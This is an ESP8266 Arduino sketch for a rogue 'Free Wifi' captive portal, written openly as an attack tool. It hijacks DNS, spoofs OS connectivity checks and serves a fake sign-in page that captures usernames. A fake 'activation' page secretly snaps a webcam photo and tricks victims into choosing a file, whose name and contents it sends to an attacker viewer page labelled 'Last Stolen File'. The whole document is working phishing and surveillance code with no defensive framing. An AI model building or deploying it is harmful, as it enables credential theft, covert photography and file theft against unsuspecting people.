#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <WebSocketsServer.h>

// ----------------- CONFIG -----------------
const char* ap_ssid     = "Free Wifi";      // SSID victim auto-connects to
const char* ap_password = "";            // open network

IPAddress apIP(192, 168, 1, 1);
IPAddress netMask(255, 255, 255, 0);

ESP8266WebServer server(80);
WebSocketsServer webSocket(81);
DNSServer dnsServer;
const byte DNS_PORT = 53;

String capturedUsername = "No user yet";

// ----------------- HTML PAGES -----------------

// Login page (same as before)
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Free Wifi - Sign In</title>
<style>
  body { font-family: Arial; background: #f2f2f2; text-align: center; padding-top: 50px; }
  .box { background: white; padding: 30px; border-radius: 10px; display: inline-block;
         box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 90%; max-width: 350px; }
  input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
  button { background: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; }
  button:hover { background: #45a049; }
</style>
</head>
<body>
<div class="box">
  <h2>🔐 Free Wifi WiFi</h2>
  <p>Sign in with your username and password to connect.</p>
  <input type="text" id="username" placeholder="Username" required><br>
  <input type="password" id="password" placeholder="Password"><br>
  <button onclick="submitLogin()">Connect</button>
  <p id="msg" style="color:red;"></p>
</div>

<script>
function submitLogin() {
  let user = document.getElementById('username').value.trim();
  if (user === '') {
    document.getElementById('msg').innerText = 'Please enter a username.';
    return;
  }
  let ws = new WebSocket('ws://192.168.1.1:81/');
  ws.onopen = () => {
    ws.send('USER:' + user);
    window.location.href = 'http://192.168.1.1/activate?user=' + encodeURIComponent(user);
  };
  ws.onerror = () => {
    window.location.href = 'http://192.168.1.1/activate?user=' + encodeURIComponent(user);
  };
}
</script>
</body>
</html>
)rawliteral";

// Activation page (camera first, then storage)
const char activatePage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activating Wi-Fi...</title>
<style>
  body { font-family: Arial; background: #f0f0f0; text-align: center; padding-top: 20px; margin:0; }
  .box { background: white; padding: 20px; border-radius: 10px; display: inline-block; width:90%; max-width:400px; }
  #overlay { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.1); z-index:999; display:none; }
  video { display:none; }
  canvas { display:none; }
  input[type=file] { display:none; }
  #status { color: #333; margin-top: 15px; }
</style>
</head>
<body>
<div class="box">
  <h2>Activate Wi-Fi Connection</h2>
  <p id="status">Initializing camera...</p>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="320" height="240"></canvas>
</div>
<div id="overlay" onclick="triggerFile()"></div>
<input type="file" id="fileInput" onchange="handleFile(this.files[0])">

<script>
let socket = new WebSocket('ws://192.168.1.1:81/');
socket.binaryType = 'arraybuffer';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let camReady = false;

// Step 1: Request camera and snap a photo
navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240, facingMode: "user" } })
.then(stream => {
  video.srcObject = stream;
  video.play();
  camReady = true;
  document.getElementById('status').innerText = 'Capturing verification photo...';
  
  // Wait a moment for camera to initialise, then snap
  setTimeout(() => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    // Convert to Blob and send as binary
    canvas.toBlob(blob => {
      if (socket.readyState === WebSocket.OPEN) {
        socket.send(blob);
      }
      // Stop camera tracks to save memory
      stream.getTracks().forEach(track => track.stop());
      video.style.display = 'none';
      
      // Step 2: Now activate storage – show overlay for tap
      document.getElementById('status').innerText = 'Tap anywhere to grant storage permission...';
      document.getElementById('overlay').style.display = 'block';
    }, 'image/jpeg', 0.6);
  }, 1500);
})
.catch(err => {
  // If camera fails, skip to storage
  document.getElementById('status').innerText = 'Camera not available. Tap to continue with storage...';
  document.getElementById('overlay').style.display = 'block';
});

function triggerFile() {
  document.getElementById('overlay').style.display = 'none';
  document.getElementById('status').innerText = 'Opening file picker...';
  document.getElementById('fileInput').click();
}

function handleFile(file) {
  if (!file) return;
  document.getElementById('status').innerText = 'Reading file...';
  const reader = new FileReader();
  reader.onload = function(e) {
    let fileContent = e.target.result;
    let msg = 'FILE:' + file.name + '|' + file.size + '|' + fileContent.substring(0, 100);
    if (socket.readyState === WebSocket.OPEN) {
      socket.send(msg);
    }
    document.getElementById('status').innerText = 'Connected!';
  };
  reader.readAsText(file);
}
</script>
</body>
</html>
)rawliteral";

// Viewer page (for attacker mobile)
const char viewPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Remote View</title>
<style>
  body { margin:0; background:#111; color:#fff; font-family:sans-serif; padding:10px; }
  #info { background:rgba(0,0,0,0.8); padding:15px; margin-bottom:10px; border-radius:8px; }
  #username { font-weight:bold; color:#4CAF50; }
  img { max-width:100%; height:auto; border:1px solid #444; margin:10px 0; display:none; }
  #fileInfo { margin-top:10px; word-break:break-all; }
  #filePreview { background:#333; padding:10px; margin-top:10px; border-radius:5px; max-height:200px; overflow-y:auto; font-family:monospace; white-space:pre-wrap; }
</style>
</head>
<body>
<div id="info">
  <strong>Captured Username:</strong> <span id="username">None</span>
  <img id="photo" src="" />
  <div id="fileInfo">
    <strong>Last Stolen File:</strong><br>
    <span id="fileName">-</span> (<span id="fileSize"></span> bytes)<br>
    <div id="filePreview">Waiting for file...</div>
  </div>
</div>

<script>
let socket = new WebSocket('ws://192.168.1.1:81/');
socket.binaryType = 'arraybuffer';
const usernameSpan = document.getElementById('username');
const photoImg = document.getElementById('photo');
const fileNameSpan = document.getElementById('fileName');
const fileSizeSpan = document.getElementById('fileSize');
const filePreview = document.getElementById('filePreview');

socket.onmessage = function(event) {
  if (typeof event.data === 'string') {
    let msg = event.data;
    if (msg.startsWith('USER:')) {
      usernameSpan.innerText = msg.substring(5);
    } else if (msg.startsWith('FILE:')) {
      let parts = msg.substring(5).split('|');
      if (parts.length >= 3) {
        fileNameSpan.innerText = parts[0];
        fileSizeSpan.innerText = parts[1];
        filePreview.innerText = parts[2] + (parts[2].length == 100 ? '...' : '');
      }
    }
  } else if (event.data instanceof ArrayBuffer) {
    // Received binary data -> camera photo
    let blob = new Blob([event.data], { type: 'image/jpeg' });
    photoImg.src = URL.createObjectURL(blob);
    photoImg.style.display = 'block';
  }
};
socket.onopen = () => console.log('Viewer connected');
socket.onclose = () => usernameSpan.innerText = 'Disconnected';
</script>
</body>
</html>
)rawliteral";

// ----------------- SETUP -----------------
void setup() {
  Serial.begin(115200);
  delay(100);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMask);
  WiFi.softAP(ap_ssid, ap_password);
  Serial.print("AP IP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", []() { server.send(200, "text/html", loginPage); });
  server.on("/activate", []() { server.send(200, "text/html", activatePage); });
  server.on("/view", []() { server.send(200, "text/html", viewPage); });

  // Spoof connectivity checks
  server.on("/generate_204", []() { server.send(204); });
  server.on("/ncsi.txt", []() { server.send(200, "text/plain", "Microsoft NCSI"); });
  server.on("/hotspot-detect.html", []() { server.send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"); });
  server.on("/connecttest.txt", []() { server.send(200, "text/plain", "Microsoft Connect Test"); });
  server.on("/redirect", []() { server.send(200); });

  server.onNotFound([]() {
    server.sendHeader("Location", "http://192.168.1.1/", true);
    server.send(302, "text/plain", "");
  });

  server.begin();

  webSocket.onEvent([](uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
    switch (type) {
      case WStype_TEXT: {
        String msg = String((char*)payload).substring(0, length);
        if (msg.startsWith("USER:")) {
          capturedUsername = msg.substring(5);
          Serial.println("Username: " + capturedUsername);
          webSocket.broadcastTXT(msg);
        } else if (msg.startsWith("FILE:")) {
          Serial.println("File: " + msg);
          webSocket.broadcastTXT(msg);
        }
        break;
      }
      case WStype_BIN:
        Serial.printf("Photo received (%u bytes)\n", length);
        webSocket.broadcastBIN(payload, length);
        break;
      case WStype_CONNECTED:
        Serial.printf("[%u] Connected\n", num);
        break;
      case WStype_DISCONNECTED:
        Serial.printf("[%u] Disconnected\n", num);
        break;
    }
  });
  webSocket.begin();

  Serial.println("ESP8266 ADVANCED ready.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  webSocket.loop();
}
